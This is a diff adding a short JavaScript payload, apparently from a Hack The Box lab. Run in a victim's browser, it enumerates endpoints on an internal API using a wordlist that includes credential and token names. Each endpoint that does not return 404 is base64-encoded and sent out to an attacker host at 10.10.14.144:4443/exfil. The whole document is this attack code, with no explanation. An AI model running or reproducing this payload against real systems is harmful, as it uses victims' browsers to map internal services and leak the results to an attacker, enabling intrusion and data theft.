@@ -1,0 +1,17 @@
+var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];
+
+for (i in endpoints){
+	try {
+		var xhr = new XMLHttpRequest();
+		xhr.open('GET', `https://api.internal-apis.htb/v1/${endpoints[i]}`, false);
+		xhr.send();
+		
+		if (xhr.status != 404){
+			var exfil = new XMLHttpRequest();
+			exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(endpoints[i]), false);
+			exfil.send();
+		}
+	} catch {
+		// do nothing
+	}
+}
